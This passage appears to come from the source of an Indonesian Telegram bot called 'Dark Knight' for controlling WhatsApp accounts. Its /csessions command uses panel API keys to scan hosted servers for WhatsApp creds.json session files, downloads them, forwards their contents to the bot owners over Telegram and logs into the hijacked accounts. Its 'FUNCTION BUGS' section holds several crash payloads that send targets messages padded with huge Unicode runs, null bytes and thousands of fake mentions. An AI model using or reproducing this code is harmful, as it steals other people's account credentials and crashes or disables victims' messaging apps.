    const candidates = [a.name, item.name, a.filename, item.filename, a.path, item.path];
    for (let c of candidates) {
      if (!c) continue;
      const s = String(c).trim();
      if (s) return s;
    }
    // fallback: try keys
    for (let k of Object.keys(item)) {
      if (/name|file|path|filename/i.test(k) && item[k]) return String(item[k]);
    }
    return "";
  }

  async function apiListFiles(domainBase, identifier, dir) {
    try {
      const res = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/list`, {
        params: { directory: dir },
        headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
      });
      return res.data;
    } catch (e) {
      if (DEBUG_CS) console.error("apiListFiles error", e && (e.response && e.response.data) ? e.response.data : e.message);
      return null;
    }
  }

  // mencoba download metadata -> lalu file. Mengatasi leading slash/no leading slash.
  async function tryDownloadFile(domainBase, identifier, absFilePath) {
    // domainBase harus tanpa trailing slash
    const candidates = [];
    const p = String(absFilePath || "").replace(/\/+/g, "/");
    if (!p) return null;
    candidates.push(p.startsWith("/") ? p : "/" + p);
    // tanpa leading slash juga coba
    const noLead = p.startsWith("/") ? p.slice(1) : p;
    if (!candidates.includes("/" + noLead)) candidates.push("/" + noLead);
    // juga coba without leading slash param (beberapa API minta tanpa slash)
    candidates.push(noLead);

    for (let c of candidates) {
      try {
        const dlMeta = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/download`, {
          params: { file: c },
          headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
        });
        if (dlMeta && dlMeta.data && dlMeta.data.attributes && dlMeta.data.attributes.url) {
          const url = dlMeta.data.attributes.url;
          const fileRes = await axios.get(url, { responseType: "arraybuffer" });
          return { buffer: Buffer.from(fileRes.data), meta: dlMeta.data };
        }
      } catch (e) {
        if (DEBUG_CS) console.error("tryDownloadFile attempt", c, e && (e.response && e.response.data) ? e.response.data : e.message);
        // lanjut ke candidate berikutnya
      }
      await sleep(REQUEST_DELAY_MS);
    }
    return null;
  }

  // rekursif defensif dengan batas kedalaman
  async function traverseAndFind(domainBase, identifier, dir = "/", depth = 0) {
    dir = normalizeDir(dir);
    if (depth > MAX_DEPTH) return [];
    const listJson = await apiListFiles(domainBase, identifier, dir);
    if (!listJson || !Array.isArray(listJson.data)) return [];

    if (DEBUG_CS) {
      try { console.log("LIST", identifier, dir, JSON.stringify(listJson).slice(0, 1200)); } catch(e){}
    }

    let found = [];
    for (let item of listJson.data) {
      const rawName = extractNameAndMaybeFullPath(item);
      if (!rawName) continue;

      const nameLooksLikePath = rawName.includes("/");
      let itemPath;
      if (nameLooksLikePath) itemPath = rawName.startsWith("/") ? rawName : "/" + rawName;
      else itemPath = (dir === "/" ? "" : dir) + "/" + rawName;
      itemPath = itemPath.replace(/\/+/g, "/");

      const baseName = rawName.includes("/") ? rawName.split("/").pop() : rawName;
      const lname = baseName.toLowerCase();

      // Jika file/dir bernama session / sessions -> buka isinya
      if (isDirectory(item) && (lname === "session" || lname === "sessions")) {
        const sessDir = normalizeDir(itemPath);
        const sessList = await apiListFiles(domainBase, identifier, sessDir);
        if (sessList && Array.isArray(sessList.data)) {
          for (let sf of sessList.data) {
            const sfName = extractNameAndMaybeFullPath(sf);
            if (!sfName) continue;
            const sfBase = sfName.includes("/") ? sfName.split("/").pop() : sfName;
            if (sfBase.toLowerCase() === "creds.json" || sfBase.toLowerCase().endsWith("creds.json")) {
              const sfPath = (sessDir === "/" ? "" : sessDir) + "/" + (sfName.includes("/") ? sfName.split("/").pop() : sfName);
              found.push({ path: sfPath.replace(/\/+/g, "/"), name: sfBase });
            }
          }
        }
      }

      // jika item adalah file creds.json langsung
      if (!isDirectory(item) && (lname === "creds.json" || lname.endsWith("creds.json"))) {
        found.push({ path: itemPath, name: baseName });
      }

      // rekursi ke subfolder
      if (isDirectory(item)) {
        const more = await traverseAndFind(domainBase, identifier, itemPath, depth + 1);
        if (more && more.length) found = found.concat(more);
      }

      await sleep(REQUEST_DELAY_MS);
    }

    // deduplicate berdasarkan path
    const uniq = [];
    const seen = new Set();
    for (let f of found) {
      const p = f.path.replace(/\/+/g, "/");
      if (!seen.has(p)) { seen.add(p); uniq.push(f); }
    }
    return uniq;
  }

  // ---- start handler ----
  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3) {
    return ctx.reply("Format salah\nContoh: /csessions http://domain.com plta_xxxx pltc_xxxx");
  }
  const domainRaw = input[0];
  const plta = input[1];
  const pltc = input[2];

  const domainBase = domainRaw.replace(/\/+$/, ""); // no trailing slash

  await ctx.reply("⏳ Sedang scan semua server untuk mencari folder `session` / `sessions` dan file `creds.json` ...", { parse_mode: "Markdown" });

  try {
    // ambil list servers
    const appRes = await axios.get(`${domainBase}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` }
    });
    const appData = appRes.data;
    if (!appData || !Array.isArray(appData.data)) {
      return ctx.reply("❌ Gagal ambil list server dari panel. Cek PLTA & domain.");
    }

    let totalFound = 0;
    for (let srv of appData.data) {
      // identifier heuristik
      const identifier = (srv.attributes && srv.attributes.identifier) || srv.identifier || (srv.attributes && srv.attributes.id);
      const name = (srv.attributes && srv.attributes.name) || srv.name || identifier || "unknown";
      if (!identifier) continue;

      // traverse defensif
      const foundList = await traverseAndFind(domainBase, identifier, "/");
      if (!foundList || foundList.length === 0) {
        // juga coba direct known common paths (fast check) - contoh yang Anda sebutkan
        const commonPaths = ["/home/container/session/creds.json", "/home/container/sessions/creds.json", "/container/session/creds.json", "/session/creds.json", "/sessions/creds.json", "home/container/session/creds.json"];
        for (let cp of commonPaths) {
          const tryDl = await tryDownloadFile(domainBase, identifier, cp);
          if (tryDl) {
            foundList.push({ path: cp.startsWith("/") ? cp : "/" + cp, name: "creds.json" });
            break;
          }
        }
      }

      if (foundList && foundList.length) {
        for (let fileInfo of foundList) {
          totalFound++;
          const filePath = fileInfo.path.replace(/\/+/g, "/").replace(/^\/?/, "/");

          // notif ke owner (hanya owner)
          for (let oid of ownerIds) {
            try {
              await ctx.telegram.sendMessage(oid, `📁 Ditemukan creds.json di server *${name}*\nPath: \`${filePath}\``, { parse_mode: "Markdown" });
            } catch (e) { if (DEBUG_CS) console.error("notif owner err", e); }
          }

          // coba download (jika traverse menemukan path, coba)
          let downloaded = null;
          try {
            downloaded = await tryDownloadFile(domainBase, identifier, filePath);
            if (!downloaded) {
              // jika gagal, coba tanpa leading slash
              downloaded = await tryDownloadFile(domainBase, identifier, filePath.replace(/^\//, ""));
            }
          } catch (e) {
            if (DEBUG_CS) console.error("download attempt error", e && e.message);
          }

          if (downloaded && downloaded.buffer) {
            try {
              const BotNumber = (name || "server").toString().replace(/\s+/g, "_");
              const sessDir = sessionPath(BotNumber);
              try { fs.mkdirSync(sessDir, { recursive: true }); } catch(e){}
              const credsPath = path.join(sessDir, "creds.json");
              fs.writeFileSync(credsPath, downloaded.buffer);

              // kirim file ke owner
              for (let oid of ownerIds) {
                try {
                  await ctx.telegram.sendDocument(oid, { source: downloaded.buffer, filename: `${BotNumber}_creds.json` });
                } catch (e) {
                  if (DEBUG_CS) console.error("sendDocument owner err", e && e.message);
                }
              }

              // (opsional) kirim juga ke pemanggil
              if (SEND_TO_CALLER) {
                try {
                  await ctx.telegram.sendDocument(ctx.chat.id, { source: downloaded.buffer, filename: `${BotNumber}_creds.json` });
                } catch (e) { if (DEBUG_CS) console.error("sendDocument caller err", e && e.message); }
              }

              // coba parse JSON dan kirim isinya (potong jika panjang)
              try {
                const txt = downloaded.buffer.toString("utf8");
                let parsed = null;
                try { parsed = JSON.parse(txt); } catch(e) { parsed = null; }
                if (parsed) {
                  const pretty = JSON.stringify(parsed, null, 2);
                  const payload = pretty.length > MAX_SEND_TEXT ? pretty.slice(0, MAX_SEND_TEXT) + "\n\n...[truncated]" : pretty;
                  for (let oid of ownerIds) {
                    try {
                      await ctx.telegram.sendMessage(oid, `\`${BotNumber}_creds.json\` (parsed JSON):\n\n\`\`\`json\n${payload}\n\`\`\``, { parse_mode: "Markdown" });
                    } catch (e) { if (DEBUG_CS) console.error("send parsed json err", e && e.message); }
                  }
                } else {
                  // kirim first ~500 chars sebagai preview kalau nggak valid json
                  const preview = txt.slice(0, 600) + (txt.length > 600 ? "\n\n...[truncated]" : "");
                  for (let oid of ownerIds) {
                    try {
                      await ctx.telegram.sendMessage(oid, `Preview \`${BotNumber}_creds.json\`:\n\n\`\`\`\n${preview}\n\`\`\``, { parse_mode: "Markdown" });
                    } catch (e) { if (DEBUG_CS) console.error("send preview err", e && e.message); }
                  }
                }
              } catch (e) {
                if (DEBUG_CS) console.error("parse/send json err", e && e.message);
              }

              // coba auto connect ke WA (tetap dicoba)
              try {
                await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
              } catch (e) {
                if (DEBUG_CS) console.error("connectToWhatsApp err", e && e.message);
              }
            } catch (e) {
              if (DEBUG_CS) console.error("save/send file err", e && e.message);
            }
          } else {
            if (DEBUG_CS) console.log("Gagal download file:", filePath, "server:", name);
          }

          // jeda antar file
          await sleep(REQUEST_DELAY_MS);
        } // for foundList
      } // if foundList

      // jeda antar server
      await sleep(REQUEST_DELAY_MS * 2);
    } // for servers

    // akhir
    if (totalFound === 0) {
      await ctx.reply("✅ Scan selesai. Tidak ditemukan creds.json di folder session/sessions pada server manapun.");
      for (let oid of ownerIds) {
        try { await ctx.telegram.sendMessage(oid, "✅ Scan selesai (publik). Tidak ditemukan creds.json."); } catch {}
      }
    } else {
      await ctx.reply(`✅ Scan selesai. Total file creds.json berhasil ditemukan: ${totalFound} (owners dikirimi file & preview).`);
      for (let oid of ownerIds) {
        try { await ctx.telegram.sendMessage(oid, `✅ Scan selesai (publik). Total file creds.json ditemukan: ${totalFound}`); } catch {}
      }
    }
  } catch (err) {
    console.error("csessions Error:", err && (err.response && err.response.data) ? err.response.data : err.message);
    await ctx.reply("❌ Terjadi error saat scan. Cek logs server.");
    for (let oid of ownerIds) {
      try { await ctx.telegram.sendMessage(oid, "❌ Terjadi error saat scan publik."); } catch {}
    }
  }
});

console.clear();
console.log(chalk.bold.white(`\n
⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣖⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⡟⣉⣽⣿⢿⡿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣿⣿⣿⡗⠋⠙⡿⣷⢌⣿⣿⠀⠀⠀⠀⠀⠀⠀
⣷⣄⣀⣿⣿⣿⣿⣷⣦⣤⣾⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀
⠈⠙⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⢀⠀⠀⠀⠀
⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⠿⠿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⡄
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⢀⡾⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣷⣶⣴⣾⠏⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠋⠁⠀⠀⠀

   ___  _     __  _          _____            
  / _ \\(_)___/ /_(_)  _____ / ___/__  _______ 
 / // / / __/ __/ / |/ / -_) /__/ _ \\/ __/ -_)
/____/_/\\__/\\__/_/|___/\\__/\\___/\\___/_/  \\__/ 
`))

console.log(chalk.cyanBright(`
─────────────────────────────────────
NAME APPS   : Dark Knight
AUTHOR      : Kyu Pedo
ID OWN      : ${ownerIds}
VERSION     : V2 Gen2
─────────────────────────────────────\n\n`));

bot.launch();

// Si anjing sialan ini yang bikin gw pusing 
setTimeout(() => {
  console.log('🔄 Starting auto-reload activated');
  forceReloadWithRetry();
}, 15000);

// nambahin periodic health check biar aman aja
setInterval(() => {
  const activeSessions = sessions.size;
  const userSessions = loadUserSessions();
  const totalRegisteredSessions = Object.values(userSessions).reduce((acc, numbers) => acc + numbers.length, 0);
  
  console.log(`📊 Health Check: ${activeSessions}/${totalRegisteredSessions} sessions active`);
  
  // Only attempt reload if we have registered sessions but none are active
  if (totalRegisteredSessions > 0 && activeSessions === 0) {
    console.log('🔄 Health check: Found registered sessions but none active, attempting reload...');
    reloadAttempts = 0; // Reset counter
    forceReloadWithRetry();
  } else if (activeSessions > 0) {
    console.log('✅ Health check: Sessions are active');
  }
}, 10 * 60 * 1000); // Check setiap 10 menit

// ================ FUNCTION BUGS HERE ================== \\
/*
  Function nya isi Ama function punya lu sendiri
*/

async function SqlBlank(sock, target) {
  console.log(`[INFO] SqlBlank called with socket:`, !!sock);

  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "123456789@newsletter",
            newsletterName: "You Know Faridz?" + 
            "ꦽ".repeat(500) + 
            "ꦾ".repeat(60000),
            jpegThumbnail: "https://files.catbox.moe/qbdvlw.jpg",
            caption: "" + "ꦾ".repeat(60000),
            inviteExpiration: Date.now() + 9999999999,
          },
        },
      },
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000),
      },
      contextInfo: {
        remoteJid: target,
        participant: target,
        stanzaId: sock.generateMessageTag?.() || generateMessageID(),
      },
    };

    console.log(`[INFO] SqlBlank mengirim ke ${target}...`);
    await sock.relayMessage(target, message, {
      userJid: target,
    });
    console.log(`✅ SqlBlank berhasil dikirim ke ${target}`);
  } catch (error) {
    console.log("error SqlBlank:\n" + error);
  }
}

async function N3xithBlank(sock, X) {
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "꙳͙͡༑ᐧ𝐒̬𝖎፝͢𝑿 ⍣᳟ 𝐍ͮ𝟑͜𝐮̽𝐕𝐞𝐫̬⃜꙳𝐗ͮ𝐨͢͡𝐗༑〽️" + "ោ៝".repeat(10000),
      caption: "𝐍𝟑𝐱̈𝒊𝐭𝐡 Cʟᴀsˢˢˢ #🇧🇳 ( 𝟑𝟑𝟑 )" + "꧀".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  try {
    await sock.relayMessage(X, msg, {
      participant: { jid: X },
      messageId: sock.generateMessageTag?.() || generateMessageID()
    });
  } catch (error) {
    console.error(`❌ Gagal mengirim bug ke ${X}:`, error.message);
  }
}

async function audiodly(sock, target) {
  
   const payload = {
    nativeFlowResponseMessage: {
      name: "call_permission_request",
      paramsJson: "\u0000".repeat(1045000),
      version: 3,
      entryPointConversionSource: "StatusMessage",
    },

    forwardingScore: 0,
    isForwarded: false,
    font: Math.floor(Math.random() * 9),
    background: `#${Math.floor(Math.random() * 16777215)
      .toString(16)
      .padStart(6, "0")}`,

    audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mpeg",
      fileSha256: Buffer.from([
        226, 213, 217, 102, 205, 126, 232, 145,
        0, 70, 137, 73, 190, 145, 0, 44,
        165, 102, 153, 233, 111, 114, 69, 10,
        55, 61, 186, 131, 245, 153, 93, 211,
      ]),
      fileLength: 432722,
      seconds: 26,
      ptt: false,
      mediaKey: Buffer.from([
        182, 141, 235, 167, 91, 254, 75, 254,
        190, 229, 25, 16, 78, 48, 98, 117,
        42, 71, 65, 199, 10, 164, 16, 57,
        189, 229, 54, 93, 69, 6, 212, 145,
      ]),
      fileEncSha256: Buffer.from([
        29, 27, 247, 158, 114, 50, 140, 73,
        40, 108, 77, 206, 2, 12, 84, 131,
        54, 42, 63, 11, 46, 208, 136, 131,
        224, 87, 18, 220, 254, 211, 83, 153,
      ]),
      directPath:
        "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
      mediaKeyTimestamp: 1746275400,

      contextInfo: {
        mentionedJid: Array.from(
          { length: 1900 },
          () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
        ),
        isSampled: true,
        participant: target,
        remoteJid: "status@broadcast",
        forwardingScore: 9741,
        isForwarded: true,
        businessMessageForwardInfo: {
          businessOwnerJid: "0@s.whatsapp.net",
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(
    target,
    {
      ...payload,
      contextInfo: {
        ...payload.contextInfo,
        participant: "0@s.whatsapp.net",
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
          ),
        ],
      },
    },
    {}
  );

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: [],
              },
            ],
          },
        ],
      },
    ],
  });
  console.log(chalk.green(`Success Send Bug 👋`));
  await sleep(3000);
}

async function crashios(sock, target) {
    await sock.relayMessage(target, {
        locationMessage: {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: "",
            name: "🧪̷⃰Ꮡ͜͡𝘾̷𝙧𝙖͢𝙯𝙮𝘼̷𝙥𝙡𝙚 ► 𝘾̷𝙧𝙖𝙨𝙝𝙄𝙤̷𝙨 ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(15000),
            address: "🧪̷⃰Ꮡ͜͡𝘾̷𝙧𝙖͢𝙯𝙮𝘼̷𝙥𝙡𝙚 ► 𝘾̷𝙧𝙖𝙨𝙝𝙄𝙤̷𝙨 ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(10000),
            url: `https://lol.crazyapple.${"🩸".repeat(25000)}.com`,
            contextInfo: {
                quotedAd: {
                    advertiserName: "x",
                    mediaType: "IMAGE",
                    jpegThumbnail: "",
                    caption: "x"
                },
                placeholderKey: {
                    remoteJid: "0@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                }
            }
        }
    }, {
        participant: { jid: target }
    });
}
async function crashios2(sock, target) {
    await sock.relayMessage(target, {
            extendedTextMessage: {
                text: "༿༑ᜳ𝐙 𝐗 𝐕ᢶ⃟ 🧪🎭⃝⃝𝐙𝐞͞𝐫̬᪳𝐐⃪͢𝐢𝐲͛𝐮͓ͦ𝐱𝐲 ⍣᳟ ̸𝐄𝐱𝐞⃟。⃟͢𝐕𝐚𝐮𝐥𝐭༑ ̻̻̻͓〽\n\n# _ - https://t.me/devorsixexposed - _ #",
                matchedText: "https://t.me/devorsixexposed",
                description: "‼️༿༑ᜳ𝐙 𝕲𝖊𝖓𝖊𝖗𝖆𝖙𝖎𝖔𝖓𝖘 𝖀𝖑𝖙𝖎𝖒𝖆𝖙𝖊‌ᢶ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(15000),
                title: "‼️༿༑ᜳ𝐙 𝕲𝖊𝖓𝖊𝖗𝖆𝖙𝖎𝖔𝖓𝖘 𝖀𝖑𝖙𝖎𝖒𝖆𝖙𝖊‌ᢶ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(15000),
                previewType: "NONE",
                jpegThumbnail: "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",
                thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
                thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
                thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
                mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
                mediaKeyTimestamp: "1743101489",
                thumbnailHeight: 641,
                thumbnailWidth: 640,
                inviteLinkGroupTypeV2: "DEFAULT"
            }
        }, { participant: { jid: target } })
    }

async function iosinvis(sock, target) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "DreamIos" + "𑇂𑆵𑆴𑆿".repeat(15000),
         address: "Dream" + "𑇂𑆵𑆴𑆿".repeat(5000),
         url: `https://dream.example.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: {
            text: "Dream\n\nCrash",
            matchedText: "https://t.me/Rxjay2",
            description: "𑇂𑆵𑆴𑆿".repeat(15000),
            title: "Aii" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
